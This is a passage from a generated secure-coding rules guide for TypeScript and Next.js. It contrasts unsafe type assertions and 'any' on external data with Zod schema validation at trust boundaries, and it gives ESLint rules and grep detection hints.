  console.error('API returned unexpected shape:', result.error.flatten())
  return NextResponse.json({ error: 'Upstream API error' }, { status: 502 })
}
const user = result.data // Fully typed
```

**The pattern to replace:**

| Before (unsafe) | After (safe) |
|-----------------|-------------|
| `await res.json() as User` | `UserSchema.parse(await res.json())` |
| `formData as FormValues` | `FormSchema.parse(Object.fromEntries(formData))` |
| `searchParams as Filters` | `FiltersSchema.parse(searchParams)` |
| `JSON.parse(str) as Config` | `ConfigSchema.parse(JSON.parse(str))` |
| `body as WebhookPayload` | `WebhookSchema.parse(body)` |

**Detection hints:**

```bash
# Find type assertions on external data
grep -rn "as \w\+\b" src/ --include="*.ts" --include="*.tsx" | grep -E "json\(\)|formData|searchParams|params|\.body|JSON\.parse"
# Find double assertions (almost always wrong)
grep -rn "as unknown as" src/ --include="*.ts" --include="*.tsx"
```

Reference: [TypeScript Type Assertions](https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#type-assertions) · [Zod Documentation](https://zod.dev/) · [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

---

## Ban `any` at Trust Boundaries — Use `unknown` with Validation

**Impact: HIGH (prevents runtime crashes from untyped external data that bypasses compile-time checks)**

`any` silently turns off TypeScript at exactly the places where type safety matters most — system boundaries where external data enters your application. When you cast API responses, form data, URL params, or webhook payloads as `any`, TypeScript stops checking the entire downstream call chain. The app compiles cleanly but crashes at runtime when the actual data doesn't match your assumptions.

This complements `qual-validate-boundaries`: even if you validate, casting to `any` anywhere in the chain nullifies the validation.

**Incorrect (any at boundaries):**

```typescript
// ❌ any spreads like a virus — disables type checking for everything it touches
export async function GET() {
  const res = await fetch('https://api.example.com/users')
  const data: any = await res.json() // TypeScript gives up here

  // No errors shown, but all of these could crash at runtime:
  const name = data.users[0].profile.displayName // Cannot read property of undefined
  const email = data.users[0].email.toLowerCase() // .toLowerCase of undefined
  return NextResponse.json({ name, email })
}
```

```typescript
// ❌ 'as any' to suppress TypeScript errors — hides real bugs
export async function POST(request: NextRequest) {
  const body = await request.json()
  const user = body as any
  await db.user.create({ data: user }) // Passes ANYTHING to the database
}
```

```typescript
// ❌ any in Server Actions — parameters come from untrusted network requests
'use server'
export async function updateSettings(settings: any) {
  await db.settings.update({ data: settings }) // Prototype pollution risk
}
```

```typescript
// ❌ Catch-all any in utility functions at boundaries
function processWebhook(payload: any) {
  // Every downstream function now accepts any shape
  updateOrder(payload.order)
  notifyUser(payload.user)
  updateInventory(payload.items)
}
```

**Correct (unknown + validation):**

```typescript
// ✅ unknown forces you to validate before use
import { z } from 'zod'

const UsersResponseSchema = z.object({
  users: z.array(z.object({
    profile: z.object({ displayName: z.string() }),
    email: z.string().email(),
  })),
})

export async function GET() {
  const res = await fetch('https://api.example.com/users')
  const json: unknown = await res.json()
  const data = UsersResponseSchema.parse(json) // Throws descriptive error if wrong

  const { displayName } = data.users[0].profile // TypeScript knows the shape
  const { email } = data.users[0] // Autocomplete works correctly
  return NextResponse.json({ name: displayName, email })
}
```

```typescript
// ✅ Server Actions: unknown parameter + schema validation
'use server'
import { z } from 'zod'

const SettingsSchema = z.object({
  theme: z.enum(['light', 'dark']),
  language: z.string().min(2).max(5),
  notifications: z.boolean(),
})

export async function updateSettings(rawInput: unknown) {
  const settings = SettingsSchema.parse(rawInput)
  await db.settings.update({ data: settings }) // Only validated fields reach DB
}
```

```typescript
// ✅ Webhook handler with proper typing
const WebhookPayloadSchema = z.discriminatedUnion('event', [
  z.object({
    event: z.literal('order.completed'),
    order: z.object({ id: z.string(), total: z.number() }),
  }),
  z.object({
    event: z.literal('user.created'),
    user: z.object({ id: z.string(), email: z.string() }),
  }),
])

export async function POST(request: NextRequest) {
  const json: unknown = await request.json()
  const payload = WebhookPayloadSchema.parse(json)

  // TypeScript narrows the type based on the event discriminator
  if (payload.event === 'order.completed') {
    await updateOrder(payload.order) // TypeScript knows .order exists
  }
}
```

**The `any` → `unknown` migration path:**

1. Change the type from `any` to `unknown`
2. TypeScript will show errors everywhere the value is used without narrowing
3. Add a Zod schema and `.parse()` at the boundary
4. All downstream code now has proper types

**ESLint enforcement:**

```json
{
  "rules": {
    "@typescript-eslint/no-explicit-any": "error",
    "@typescript-eslint/no-unsafe-assignment": "error",
    "@typescript-eslint/no-unsafe-member-access": "error"
  }
}
```

**Detection hints:**

```bash
# Find 'any' at system boundaries
grep -rn ": any\|as any\|<any>" src/ --include="*.ts" --include="*.tsx" | grep -i "request\|response\|fetch\|json\|param\|form\|webhook\|payload"
# Count total 'any' usage
grep -rn ": any\b" src/ --include="*.ts" --include="*.tsx" -c
```

Reference: [TypeScript unknown vs any](https://www.typescriptlang.org/docs/handbook/2/functions.html#unknown) · [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

---

## Validate External Data at System Boundaries

**Impact: MEDIUM (prevents runtime crashes from unexpected API responses or user input)**

TypeScript types disappear at runtime. When data crosses a system boundary — API responses, form submissions, URL parameters, webhook payloads, third-party SDK responses — the shape is not guaranteed. Runtime validation with a library like Zod catches malformed data before it causes cryptic errors deep in your application.

**Incorrect (trusting external data with only TypeScript):**

```typescript
// ❌ TypeScript doesn't protect you at runtime
interface User {
  id: string
  name: string
  email: string
}

export async function GET() {
  const res = await fetch('https://api.example.com/users/1')
  const user: User = await res.json() // ← This is a lie. It could be anything.
  return Response.json({ greeting: `Hello ${user.name}` })
  // If API returns { id: 1, fullName: "..." } → user.name is undefined → "Hello undefined"
}
```

```typescript
// ❌ Trusting URL params
export default function Page({ searchParams }: { searchParams: { page: string } }) {
  const page = parseInt(searchParams.page) // Could be NaN, negative, or 999999
  const data = await fetchItems({ skip: page * 20 })
}
```

**Correct (validate at the boundary):**

```typescript
// ✅ Validate API responses
import { z } from 'zod'

const UserSchema = z.object({
  id: z.string(),
  name: z.string(),
  email: z.string().email(),
})

type User = z.infer<typeof UserSchema> // Derive the type from the schema

export async function GET() {
  const res = await fetch('https://api.example.com/users/1')
  const json = await res.json()
  const user = UserSchema.parse(json) // Throws descriptive error if shape is wrong
  return Response.json({ greeting: `Hello ${user.name}` })
}
```

```typescript
// ✅ Validate URL search params
const SearchParamsSchema = z.object({
  page: z.coerce.number().int().min(1).max(100).default(1),
  sort: z.enum(['newest', 'oldest', 'popular']).default('newest'),
})

export default async function Page({
  searchParams,
}: {
  searchParams: Record<string, string | string[] | undefined>
}) {
  const { page, sort } = SearchParamsSchema.parse(searchParams)
  const data = await fetchItems({ skip: (page - 1) * 20, sort })
}
```

```typescript
// ✅ Validate Server Action input
'use server'

const ContactFormSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  message: z.string().min(10).max(5000),
})

export async function submitContact(formData: FormData) {
  const input = ContactFormSchema.parse({
    name: formData.get('name'),
    email: formData.get('email'),
    message: formData.get('message'),
  })

  await sendEmail(input)
  return { success: true }
}
```

**Detection hints:**

```bash
# Find fetch calls without validation
grep -rn "await.*\.json()" src/ --include="*.ts" --include="*.tsx" | grep -v "parse\|schema\|validate\|zod"
# Find type assertions on external data
grep -rn "as \w\+\b" src/ --include="*.ts" --include="*.tsx" | grep -E "json\(\)|formData|searchParams|params"
```

Reference: [Zod Documentation](https://zod.dev/) · [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

---

*Generated by BeforeMerge build script on 2026-02-27.*
*Version: 0.1.0 | Rules: 33*